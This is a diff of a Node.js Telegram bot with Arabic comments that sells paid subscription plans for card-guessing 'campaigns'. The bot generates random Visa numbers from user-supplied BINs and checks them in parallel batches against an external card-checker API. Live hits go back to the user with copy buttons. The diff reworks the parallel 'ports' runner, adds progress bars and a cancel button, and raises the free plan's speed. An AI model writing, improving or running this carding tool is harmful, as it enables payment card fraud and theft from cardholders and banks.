@@ -35,10 +35,10 @@ function getPlans() {
     const data = loadData();
     if (!data.plans) {
         data.plans = {
-            free: { nameAr: 'مجاني', nameEn: 'Free', price: 0, cardsLimit: 15, campaignsLimit: 2, speed: 1 },
+            free: { nameAr: 'مجاني', nameEn: 'Free', price: 0, cardsLimit: 15, campaignsLimit: 2, speed: 20 },
             plus: { nameAr: 'Plus', nameEn: 'Plus', price: 3, cardsLimit: 70, campaignsLimit: 3, speed: 30 },
             pro: { nameAr: 'Pro', nameEn: 'Pro', price: 5, cardsLimit: 150, campaignsLimit: 5, speed: 60 },
-            vip: { nameAr: 'VIP', nameEn: 'VIP', price: 8, cardsLimit: 350, campaignsLimit: 7, speed: 100 }
+            vip: { nameAr: 'VIP', nameEn: 'VIP', price: 8, cardsLimit: 350, campaignsLimit: 7, speed: 80 }
         };
         saveData(data);
     }
@@ -159,7 +159,7 @@ function updatePaymentProof(id, status) {
 // ==========================================
 const userLang = new Map();
 const adminSet = new Set([643309456]);
-const userStates = new Map(); // { step, bins, defaultCount, cancelFlag, activeCampaigns, progressMessages }
+const userStates = new Map(); // لكل مستخدم: { step, bins, defaultCount, cancelFlag, progressMsgId, campaignsData }
 const BINANCE_PAY_ID = '842505320';
 
 // ==========================================
@@ -240,7 +240,6 @@ function generateRandomCode() {
     return Math.random().toString(36).substring(2, 10).toUpperCase();
 }
 
-// API call with retry
 async function checkSingleCard(cardString, chatId, isSilent = false, retries = 2) {
     try {
         const response = await axios.post('https://api.chkr.cc/', { data: cardString }, {
@@ -283,98 +282,27 @@ function getCopyButtons(fullCard, lang) {
 }
 
 // ==========================================
-// نظام السرعة المتقدمة - تقسيم الحملة على منافذ متعددة
+// دوال عرض التقدم المتقدم (المنافذ وأشرطة التقدم)
 // ==========================================
-async function runCampaignParallel(chatId, bin, totalCards, campaignId, speedPercent, state) {
-    const lang = userLang.get(chatId) || 'ar';
-    const dict = translations[lang];
-    
-    // حساب عدد المنافذ بناءً على السرعة (1-100): 0% -> 1 منفذ، 100% -> 10 منافذ
-    const numPorts = Math.max(1, Math.min(10, Math.floor(speedPercent / 10) + 1));
-    const cardsPerPort = Math.floor(totalCards / numPorts);
-    const remainder = totalCards % numPorts;
-    
-    // إنشاء رسالة التقدم الرئيسية
-    let progressMsg = await bot.sendMessage(chatId, `🔄 جاري تهيئة ${numPorts} منفذ لتخمين ${totalCards} فيزا على BIN: ${bin}\n━━━━━━━━━━━━━━\n📌 BIN: ${bin}`);
-    state.progressMsgId = progressMsg.message_id;
-    
-    // مصفوفة لتخزين نتائج كل منفذ
-    let portResults = Array(numPorts).fill().map(() => ({ hit: 0, completed: 0, total: 0 }));
-    let totalHits = 0;
-    let completedPorts = 0;
-    
-    // تشغيل المنافذ بالتوازي
-    const portPromises = [];
-    for (let p = 0; p < numPorts; p++) {
-        const startIdx = p * cardsPerPort + 1;
-        const endIdx = (p === numPorts - 1) ? totalCards : (p + 1) * cardsPerPort;
-        const count = endIdx - startIdx + 1;
-        if (count <= 0) continue;
-        portResults[p].total = count;
-        
-        const portPromise = (async () => {
-            let portHit = 0;
-            // توليد جميع الفيزات دفعة واحدة للمنفذ (يمكن تحسينها بتوليد متسلسل لكننا نريد سرعة)
-            const visas = [];
-            for (let i = 0; i < count; i++) {
-                visas.push(generateFullVisa(bin));
-            }
-            // فحص جميع الفيزات بالتوازي داخل المنفذ (مع تقييد التوازي لتجنب الضغط)
-            const batchSize = 5;
-            for (let i = 0; i < visas.length; i += batchSize) {
-                if (state.cancelFlag) break;
-                const batch = visas.slice(i, i + batchSize);
-                const results = await Promise.all(batch.map(v => checkSingleCard(v, chatId, true)));
-                for (let j = 0; j < results.length; j++) {
-                    const result = results[j];
-                    if (result && result.isLive) {
-                        portHit++;
-                        totalHits++;
-                        const fullVisa = batch[j];
-                        const flag = getFlag(result.country);
-                        const cardType = getCardType(fullVisa.split('|')[0]);
-                        const liveText = dict.live_result
-                            .replace('{card}', fullVisa)
-                            .replace('{type}', cardType)
-                            .replace('{country}', result.country)
-                            .replace('{flag}', flag);
-                        const buttons = getCopyButtons(fullVisa, lang);
-                        await bot.sendMessage(chatId, liveText, { parse_mode: 'Markdown', ...buttons });
-                    }
-                }
-                portResults[p].completed = Math.min(i + batchSize, visas.length);
-                const percent = Math.floor((portResults.reduce((a,b) => a + b.completed, 0) / totalCards) * 100);
-                try {
-                    await bot.editMessageText(`🔄 جاري إنشاء الفيزا ${portResults.reduce((a,b) => a + b.completed, 0)}/${totalCards} | السرعة: ${speedPercent}% (${numPorts} منفذ) ${'▰'.repeat(Math.floor(percent/10))}${'▱'.repeat(10-Math.floor(percent/10))}\n━━━━━━━━━━━━━━\n📌 BIN: ${bin}`, {
-                        chat_id: chatId, message_id: progressMsg.message_id
-                    });
-                } catch(e) {}
-            }
-            return portHit;
-        })();
-        portPromises.push(portPromise);
+function formatProgressBar(percent, width = 10) {
+    const filled = Math.round(percent / 100 * width);
+    return '▰'.repeat(filled) + '▱'.repeat(width - filled);
+}
+
+function buildProgressText(campaignsData, speedPercent, lang) {
+    let text = `🔄 جاري إنشاء الفيزا\nالسرعة: ${speedPercent}%\n`;
+    for (const data of campaignsData) {
+        const percent = data.total > 0 ? (data.current / data.total * 100) : 0;
+        const bar = formatProgressBar(percent);
+        const remaining = data.total - data.current;
+        text += `\nالمنفذ: ${data.bin}\n${bar} ${percent.toFixed(1)}%\nالعد التنازلي: ${remaining} بطاقة متبقية\n`;
     }
-    
-    const hitsArray = await Promise.all(portPromises);
-    const hit = hitsArray.reduce((a,b) => a + b, 0);
-    
-    // تحديث قاعدة البيانات
-    updateCampaign(campaignId, totalCards, hit, 'completed');
-    
-    try { await bot.deleteMessage(chatId, progressMsg.message_id); } catch(e) {}
-    
-    if (hit === 0) {
-        const noLive = dict.no_live_found.replace('{total}', totalCards);
-        const keyboard = { reply_markup: { inline_keyboard: [[{ text: dict.new_campaign_btn, callback_data: 'menu_guess' }]] } };
-        await bot.sendMessage(chatId, noLive, keyboard);
-    } else {
-        await bot.sendMessage(chatId, dict.summary.replace('{hit}', hit).replace('{total}', totalCards));
-    }
-    return hit;
+    text += `\n━━━━━━━━━━━━━━`;
+    return text;
 }
 
 // ==========================================
-// تشغيل حملات متعددة بالتوازي الكامل
+// تشغيل حملات متعددة بالتوازي مع عرض تقدم موحد
 // ==========================================
 async function runMultipleCampaignsParallel(chatId, binsList, totalCardsPerBin) {
     const subscriber = getSubscriber(chatId);
@@ -393,30 +321,134 @@ async function runMultipleCampaignsParallel(chatId, binsList, totalCardsPerBin) 
     if (!state) return;
     
     // إنشاء الحملات في قاعدة البيانات
-    const campaignIds = [];
+    const campaignsData = [];
     for (const bin of binsList) {
         const cid = createCampaign(chatId, bin, totalCardsPerBin);
-        campaignIds.push(cid);
+        campaignsData.push({
+            bin,
+            cid,
+            total: totalCardsPerBin,
+            current: 0,
+            hit: 0,
+            active: true
+        });
     }
     
-    // تشغيل جميع الحملات بالتوازي
-    const campaignPromises = binsList.map(async (bin, idx) => {
-        const cid = campaignIds[idx];
-        const hits = await runCampaignParallel(chatId, bin, totalCardsPerBin, cid, speedPercent, state);
-        return { bin, hits };
+    // إرسال رسالة التقدم الأولية
+    let progressText = buildProgressText(campaignsData, speedPercent);
+    let progressMsg = await bot.sendMessage(chatId, progressText, {
+        reply_markup: { inline_keyboard: [[{ text: '❌ إلغاء الحملات', callback_data: 'cancel_all_campaigns' }]] }
+    });
+    state.progressMsgId = progressMsg.message_id;
+    
+    // وظيفة لتحديث رسالة التقدم
+    async function updateProgress() {
+        if (state.cancelFlag) return;
+        const newText = buildProgressText(campaignsData, speedPercent);
+        try {
+            await bot.editMessageText(newText, {
+                chat_id: chatId,
+                message_id: progressMsg.message_id,
+                reply_markup: { inline_keyboard: [[{ text: '❌ إلغاء الحملات', callback_data: 'cancel_all_campaigns' }]] }
+            });
+        } catch(e) {}
+    }
+    
+    // تشغيل جميع الحملات بالتوازي (لكل حملة منطقها الخاص)
+    const campaignPromises = campaignsData.map(async (camp) => {
+        const bin = camp.bin;
+        const total = camp.total;
+        const cid = camp.cid;
+        
+        // عدد المنافذ الداخلية للحملة الواحدة يعتمد على السرعة
+        const numPorts = Math.max(1, Math.min(10, Math.floor(speedPercent / 10) + 1));
+        const cardsPerPort = Math.floor(total / numPorts);
+        const remainder = total % numPorts;
+        
+        // تشغيل المنافذ بالتوازي داخل الحملة
+        const portPromises = [];
+        let portStart = 1;
+        for (let p = 0; p < numPorts; p++) {
+            const portCards = (p === numPorts - 1) ? cardsPerPort + remainder : cardsPerPort;
+            if (portCards <= 0) continue;
+            const startIdx = portStart;
+            const endIdx = portStart + portCards - 1;
+            portStart = endIdx + 1;
+            
+            const portPromise = (async () => {
+                let portHit = 0;
+                // توليد جميع الفيزات لهذا المنفذ دفعة واحدة
+                const visas = [];
+                for (let i = 0; i < portCards; i++) {
+                    visas.push(generateFullVisa(bin));
+                }
+                // فحصها بالتوازي داخل المنفذ (دفعات صغيرة لتجنب الضغط)
+                const batchSize = 5;
+                for (let i = 0; i < visas.length; i += batchSize) {
+                    if (state.cancelFlag) break;
+                    const batch = visas.slice(i, i + batchSize);
+                    const results = await Promise.all(batch.map(v => checkSingleCard(v, chatId, true)));
+                    for (let j = 0; j < results.length; j++) {
+                        const result = results[j];
+                        if (result && result.isLive) {
+                            portHit++;
+                            camp.hit++;
+                            const fullVisa = batch[j];
+                            const flag = getFlag(result.country);
+                            const cardType = getCardType(fullVisa.split('|')[0]);
+                            const liveText = dict.live_result
+                                .replace('{card}', fullVisa)
+                                .replace('{type}', cardType)
+                                .replace('{country}', result.country)
+                                .replace('{flag}', flag);
+                            const buttons = getCopyButtons(fullVisa, userLang.get(chatId) || 'ar');
+                            // إرسال النتيجة في رسالة جديدة (ستظهر فوق رسالة التقدم)
+                            await bot.sendMessage(chatId, liveText, { parse_mode: 'Markdown', ...buttons });
+                            // بعد إرسال النتيجة، نقوم بحذف رسالة التقدم الحالية وإعادة إنشائها أسفل النتيجة
+                            // لكننا سنقوم ببساطة بتحديث رسالة التقدم لتبقى موجودة (ستبقى أسفل النتيجة لأنها أحدث؟ لا، النتيجة أحدث، لذا ستكون أسفل رسالة التقدم. لعكس ذلك، سنحذف التقدم ونرسله مجددًا بعد النتيجة)
+                            try {
+                                await bot.deleteMessage(chatId, progressMsg.message_id);
+                            } catch(e) {}
+                            // إعادة إنشاء رسالة تقدم جديدة
+                            progressMsg = await bot.sendMessage(chatId, buildProgressText(campaignsData, speedPercent), {
+                                reply_markup: { inline_keyboard: [[{ text: '❌ إلغاء الحملات', callback_data: 'cancel_all_campaigns' }]] }
+                            });
+                            state.progressMsgId = progressMsg.message_id;
+                        }
+                    }
+                    // تحديث التقدم بعد كل دفعة
+                    camp.current = Math.min(camp.current + batch.length, camp.total);
+                    await updateProgress();
+                }
+                return portHit;
+            })();
+            portPromises.push(portPromise);
+        }
+        const hitsArray = await Promise.all(portPromises);
+        const totalHits = hitsArray.reduce((a,b) => a + b, 0);
+        updateCampaign(cid, camp.total, totalHits, 'completed');
+        return totalHits;
     });
     
-    const results = await Promise.all(campaignPromises);
-    const totalHits = results.reduce((sum, r) => sum + r.hits, 0);
+    const allHits = await Promise.all(campaignPromises);
+    const totalHits = allHits.reduce((a,b) => a + b, 0);
     
-    if (!state.cancelFlag) {
-        await bot.sendMessage(chatId, `🏁 انتهت جميع الحملات (${binsList.length} حملة بالتوازي). إجمالي البطاقات الصالحة: ${totalHits}`);
+    // حذف رسالة التقدم النهائية
+    try { await bot.deleteMessage(chatId, progressMsg.message_id); } catch(e) {}
+    
+    if (totalHits === 0) {
+        const noLive = dict.no_live_found.replace('{total}', binsList.length * totalCardsPerBin);
+        const keyboard = { reply_markup: { inline_keyboard: [[{ text: dict.new_campaign_btn, callback_data: 'menu_guess' }]] } };
+        await bot.sendMessage(chatId, noLive, keyboard);
+    } else {
+        await bot.sendMessage(chatId, dict.summary.replace('{hit}', totalHits).replace('{total}', binsList.length * totalCardsPerBin));
     }
+    
     userStates.delete(chatId);
 }
 
 // ==========================================
-// دوال الاشتراكات والقوائم (نفس السابق مع تعديلات طفيفة)
+// دوال الاشتراكات والقوائم (مختصرة)
 // ==========================================
 async function handleSubscription(chatId, plan) {
     const lang = userLang.get(chatId) || 'ar';
@@ -641,7 +673,7 @@ bot.on('callback_query', async (query) => {
         return;
     }
     
-    // زر تعيين العدد الافتراضي للحملات (يطلب من المستخدم إدخال الرقم)
+    // زر تعيين العدد الافتراضي للحملات
     if (data === 'set_default_count') {
         const state = userStates.get(chatId);
         if (state && state.bins.length > 0) {
@@ -678,6 +710,17 @@ bot.on('callback_query', async (query) => {
         }
         state.step = 'running';
         await runMultipleCampaignsParallel(chatId, state.bins, state.defaultCount);
+        return;
+    }
+    
+    // إلغاء جميع الحملات
+    if (data === 'cancel_all_campaigns') {
+        const state = userStates.get(chatId);
+        if (state) {
+            state.cancelFlag = true;
+            userStates.delete(chatId);
+            await bot.sendMessage(chatId, '❌ تم إلغاء جميع الحملات.');
+        }
         return;
     }
     
@@ -952,7 +995,7 @@ bot.on('message', async (msg) => {
         return;
     }
     
-    // أوامر الأدمن النصية (مثل السابق)
+    // أوامر الأدمن النصية
     if (state && state.step === 'admin_edit_price') {
         const parts = text.split('=');
         if (parts.length !== 2) { await bot.sendMessage(chatId, 'صيغة غير صحيحة'); return; }
@@ -1053,7 +1096,7 @@ bot.on('message', async (msg) => {
 });
 
 // ==========================================
-// الترجمات (كما هي مع إضافة عبارات جديدة)
+// الترجمات (كاملة)
 // ==========================================
 const translations = {
     ar: {
@@ -1132,4 +1175,4 @@ const translations = {
     }
 };
 
-console.log('✅ البوت يعمل الآن بنظام السرعة المتقدمة والحملات المتوازية وتعيين العدد الافتراضي.');
+console.log('✅ البوت يعمل الآن بنظام السرعة المتقدمة وعرض المنافذ مع أشرطة التقدم.');
